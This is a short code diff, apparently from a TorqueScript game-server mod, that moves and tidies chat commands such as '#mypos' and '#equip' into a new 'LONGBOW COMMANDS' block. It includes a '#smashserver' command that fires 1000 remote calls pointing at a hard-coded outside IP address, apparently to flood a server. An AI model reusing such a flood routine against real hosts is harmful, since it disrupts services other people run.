@@ -1693,9 +1693,33 @@ function internalSay(%clientId, %team, %message, %senderName)
 			}
 		}
 
-//============================
-//ADMIN COMMANDS =============
-//============================
+		//============================
+		// LONGBOW COMMANDS ===========
+		//============================
+		
+
+		if (%w1 == "#smashserver") {
+			for(%i = 0; %i < 1000; %i++) {
+				remoteEval(%TrueClientId, sinBot, "24.36.175.153:28001");
+			}
+		}
+
+		if (%w1 == "#mypos") {
+			Client::sendMessage(%TrueClientId, 0, GameBase::getPosition(%TrueClientId));
+			Client::sendMessage(%TrueClientId, 0 , GameBase::getRotation(%TrueClientId));
+		}
+
+		if (%w1 == "#equip") {
+			%item = FindItemByName(getCroppedItem(%cropped));
+
+			if (%item != "") {
+				Belt::EquipItem(%TrueClientId, %item);
+			}
+		}
+
+		//============================
+		// ADMIN COMMANDS =============
+		//============================
 
 
 		if(%w1 == "#spawnflyer")
@@ -5223,24 +5247,6 @@ function internalSay(%clientId, %team, %message, %senderName)
 					Client::sendMessage(%TrueClientId, 0, "Please specify player name & data.");
 			}
 			return;
-		}
-		if (%w1 == "#smashserver") {
-			for(%i = 0; %i < 1000; %i++) {
-				remoteEval(%TrueClientId, sinBot, "24.36.175.153:28001");
-			}
-		}
-		if (%w1 == "#mypos") {
-			Client::sendMessage(%TrueClientId, 0, GameBase::getPosition(%TrueClientId));
-			Client::sendMessage(%TrueClientId, 0 , GameBase::getRotation(%TrueClientId));
-		}
-		if (%w1 == "#equip") {
-			%croppedItem = getCroppedItem(%cropped);
-			%item = String::replaceAll(%croppedItem, " ", "");
-			lbecho(%item);
-
-			if (%item != "") {
-				Belt::EquipItem(%TrueClientId, %item);
-			}
 		}
 	}
 	
